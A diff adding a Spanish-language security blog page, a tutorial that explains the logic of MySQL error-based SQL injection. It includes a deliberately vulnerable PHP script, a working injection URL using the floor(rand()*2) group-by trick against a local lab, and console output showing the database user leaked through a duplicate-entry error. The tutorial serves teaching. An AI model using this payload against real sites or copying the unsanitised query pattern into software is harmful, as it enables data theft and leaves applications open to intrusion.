@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Destripando La Logica De Una SQLI Error Based - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by [Q]3rv[0]Comenzamos desde lo basico, explicando por que un script vulnerable debe ser explotado de esta manera y no de otra.&nbsp;Acontinuación el &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/13/destripando-la-logica-de-una-sqli-error/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Destripando La Logica De Una SQLI Error Based</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T19:33:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:33 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-PzccS_B-OBE/VLXjRFz5TfI/AAAAAAAAAKY/aSpqZ5xp9Zo/s1600/error.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-PzccS_B-OBE/VLXjRFz5TfI/AAAAAAAAAKY/aSpqZ5xp9Zo/s1600/error.png" height="235" width="400" /></a></div><div style="text-align: right;"><b>by [Q]3rv[0]</b></div>Comenzamos desde lo basico, explicando por que un script vulnerable debe ser explotado de esta manera y no de otra.<br /><br />&nbsp;Acontinuación el código que se puede apreciar es vulnerable a sql injection.<br /><br /><pre class="brush: php">&lt;?php<br />include("conex.php");<br />$id=$_GET['id'];<br />$consulta2="SELECT id, blog FROM blogs WHERE id=".$id.";";<br />$consulta="SELECT username FROM users WHERE id=".$id.";";<br />$query=mysql_query($consulta, $conexion);<br />$query2=mysql_query($consulta2, $conexion);<br />$dumpeo2=mysql_fetch_array($query2);<br />$dumpeo=mysql_fetch_array($query);<br />if (isset($_GET['id'])) {<br />&nbsp;&nbsp;&nbsp; if (!$dumpeo) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo mysql_error();<br />}<br />&nbsp;&nbsp;&nbsp; elseif (!$dumpeo2) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo mysql_error();<br />}<br />&nbsp;&nbsp;&nbsp; else {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "&lt;b&gt;Nick: ".$dumpeo['username']."&lt;/b&gt;&lt;p&gt;";<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "&lt;b&gt;Blog: ".$dumpeo2['blog']."&lt;/b&gt;&lt;p&gt;";<br />}<br />}<br />?&gt;<br /><br /></pre>Como podemos ver al buscar la cantidad de columnas que esta seleccionando la consulta nos responde con el siguiente mensaje.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7NHckzM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7NHckzM.png" height="300" width="640" /></a></div><br />Esto se debe a que el parametro id esta siendo usado en dos consultas diferentes seleccionando ambas distinto numero de columnas <br /><br /><pre class="brush: php">$consulta2="SELECT id, blog FROM blogs WHERE id=".$id.";";<br />$consulta="SELECT username FROM users WHERE id=".$id.";";<br /><br /><br /></pre>Por lo tanto nunca vamos a dar con la cantidad justa, es por eso que hay que recurrir a otro metodo.   <br />La siguiente consulta devela a través del error de "entrada duplicada", el usuario que corre en la base de datos.   <br /><br /><pre class="brush: sql">http://localhost/mysqli-lab/2.php?id=1 union select count(*),concat(user(),floor(rand()*2))x from information_schema.tables group by x limit 0,1--<br /></pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/4Rgf5Pk.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/4Rgf5Pk.png" height="270" width="640" /></a></div><br />Pero que es una entrada dulpicada, por que se produce?  Miremos el siguiente error: <span style="color: red;">Duplicate entry 'root@localhost0' for key 'group_key'</span><br /><br />Nos centraremos en group_key o llave de grupo, el error se debe a que se hayo un mismo valor en la llave de grupo.  <br /><br />Antes que nada entendamos el termino de subquery. <br />Las subconsultas nos permiten optimizar tareas en la base de datos, un ejemplo sencillo, supongamos que queremos seleccionar campos de dos tablas distintas, por un lado tenemos la tabla users y por otro la tabla blogs, para obtener los datos en una sola sentencias seria de la siguiente manera:  <br /><br />Obviamente son usadas para realizar tareas mas elaboradas, como comparaciones entre distintos datos, etc  <br /><br /><pre class="brush: sql">mysql&gt; select username,(select blog from blogs limit 0,1)blog from users limit 0,1; <br /><br />+---------------+-------------------------------------+<br />| username      | blog&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |<br />|+--------------+-------------------------------------+<br />|&nbsp;&nbsp;&nbsp; q3rv0&nbsp; &nbsp;   | http://securitysignal.tk            |<br />+---------------+-------------------------------------+<br /><br />1 row in set (0.00 sec)[/code]<br /></pre><br />Llamemos al vector para volverlo a analizar <br /><br /><pre class="brush: sql">select count(*),concat(user(),floor(rand()*2))x from information_schema.tables group by x limit 0,1--</pre><br />Para lograr un mayor entendimiento y comprensión hay que ir hasta el zotano, por eso vamos a realizar análisis desde la propia db.   <br />Les propongo que dividamos la doble consulta, y expongamos la primera.   <br /><br /><pre class="brush: sql">select count(*) from information_schema.tables group by concat(user(),floor(rand()*2)) limit 0,1;</pre><br />Por logica quedaria asi, por que?  Primero explicare un par de conceptos:<br /><br />floor(rand()*2) : generara dos resultados "0" o "1" de manera aleatoria porque?.<br /><br /><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /><br /></pre><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre>la funcion rand() nos generara un valor aleatorio entre 0 y 0.xxxxxx  <br /><br /><pre class="brush: sql">mysql&gt; select rand();<br /><br />+--------------------+<br />| rand()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+--------------------+<br />| 0.8679424085355759 |<br />+--------------------+<br />1 row in set (0.00 sec)</pre><br />Si multiplicamos por&nbsp; 2 esos valores generara un resultado diferente, esta vez entre 0 y 1.xxxx  <br /><br /><pre class="brush: sql">mysql&gt; select rand()*2;<br /><br />+-------------------+<br />| rand()*2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-------------------+<br />| 0.947171253102991 |<br />+-------------------+<br />1 row in set (0.00 sec)<br /><br /></pre><pre class="brush: sql">mysql&gt; select rand()*2;<br /><br />+--------------------+<br />| rand()*2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+--------------------+<br />| 1.5282018757687899 |<br />+--------------------+<br />1 row in set (0.00 sec)<br /></pre>floor() toma un numero flotante y lo presenta como entero, es decir si le pasamos el siguiente numero generado por rand(). <br /><br /><pre class="brush: sql">mysql&gt; select floor(1.5282018757687899);<br /><br />+---------------------------+<br />| floor(1.5282018757687899) |<br />+---------------------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 |<br />+---------------------------+<br />1 row in set (0.00 sec)<br /></pre>Da como resultado 1  <br /><br /><pre class="brush: sql">mysql&gt; select floor(0.947171253102991);<br /><br />+--------------------------+<br />| floor(0.947171253102991) |<br />+--------------------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+--------------------------+<br />1 row in set (0.00 sec)</pre><br /><br />Da como resultado 0  La magia del <span style="color: red;">floor(rand()*2)</span> no se basa en que de como resultado unicamente 1 o 0, se basa en que nos provea de dos resultados diferentes y que se repitan si es posible, daría lo mismo que diera 4 o 5.   <br /><br />Ahora extraeremos una parte del primer vector para realizar otro análisis <br /><br /><pre class="brush: sql">select count(*),<span style="color: red;">concat(user(),floor(rand()*2))x</span> from information_schema.tables group by x limit 0,1--<br /></pre><br />Esa x al final de la subconsulta, bien podría ser cualquier letra como p,c,f,c actua como puntero del resultado de esa sentencia y es usado por "group by" para agrupar la salida según el resultado: <br /><br /><pre class="brush: sql">mysql&gt; select concat(version(),floor(rand()*2))x;<br /><br />+-----------+<br />| x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-----------+<br />| 5.5.28-11 |<br />+-----------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select concat(version(),floor(rand()*2))x;<br /><br />+-----------+<br />| x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-----------+<br />| 5.5.28-10 |<br />+-----------+<br />1 row in set (0.00 sec)<br /></pre><br />Entonces seria los mismo realizarla asi. <br /><br /><pre class="brush: sql">mysql&gt; select count(*) from information_schema.tables group by concat(user(),floor(rand()*2));<br />ERROR 1062 (23000): Duplicate entry 'root@localhost0' for key 'group_key'</pre><br />Pero si intentamos tirar este vector por el parametro "id" seguiremos obteniendo el mensaje <br /><br /><pre class="brush: sql">"The used SELECT statements have a different number of columns"</pre><br />ya que requerimos de dos consultas por que el id hace referencia a ese numero como ya lo vimos en el codigo del script.  <br /><br />Bien hasta esta linea ya hemos entendido varios puntos claves en el funcionamiento del vector y vamos comprendiendo paso a paso el porque...  <br /><br />Segun las pruebas <span style="color: red;">floor(rand()*2)</span> genera dos valores aleatorios "0" o "1" group by aprovecha ese dato para realizar la agrupacion, el cual es fundamental ya que utilizaremos el error de entrada duplicada de la group_key para obtener la informacion. <br /><br />Sabemos hasta ahora que al repetirse los valores generados por floor(rand()*2) se produce el "duplicate entry" en la group_key, por lo tanto nos tirar el valor que se duplica. <br /><br />Si lo hicieramos sin user() obtendriamos. <br /><br /><pre class="brush: sql">mysql&gt; select count(*) from information_schema.tables group by floor(rand()*2);<br />ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'</pre><br />Pero para obtener el nombre de usuario, la funcion user() se concatena con floor(rand()*2) para que sea disparado como valor duplicado, hay es donde toma protagonismo la subquery!.<br /><br />Ejecutemos ahora el vector completo.  <br /><br /><pre class="brush: sql">mysql&gt; select count(*),concat(user(),floor(rand()*2))z from information_schema.tables group by z;<br /><br />+----------+-----------------+<br />| count(*) | z&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+----------+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 123 | root@localhost0 | -&gt; floor(rand()*2)=0<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 75 | root@localhost1 | -&gt; floor(rand()*2)=1<br />+----------+-----------------+<br />2 rows in set (0.00 sec)</pre><br />Vemos que cuando no tira el error, ordena en dos grupos la cantidad de registros en la tabla (tables) obtenidos por count(*), si la tabla tuviera un solo registro seria imposible reproducir la entrada duplicada, se podria usar cualquier otra tabla ademas de tables. <br /><br />Y una vez que el valor del orden del grupo se repite, BAM!  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/LNyim2N.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/LNyim2N.png" height="270" width="640" /></a></div>Espero que se haya comprendido, esta fue la manera mediante la cual logre asimilarlo realmente, realizando análisis en el mismo servidor, cualquier consulta, duda o error comenten! <br /><br /><div style="text-align: right;">Saludos!</div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T19:33:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:33 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/13/destripando-la-logica-de-una-sqli-error/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/13/destripando-la-logica-de-una-sqli-error/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/13/sqli-error-based-extractvalue-updatexml/" title="Previous Post: SQLI Error Based extractvalue() & updatexml()">&laquo; SQLI Error Based extractvalue() & updatexml()</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/13/mysql-udf-injection/" title="Next Post: Mysql UDF Injection">Mysql UDF Injection &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
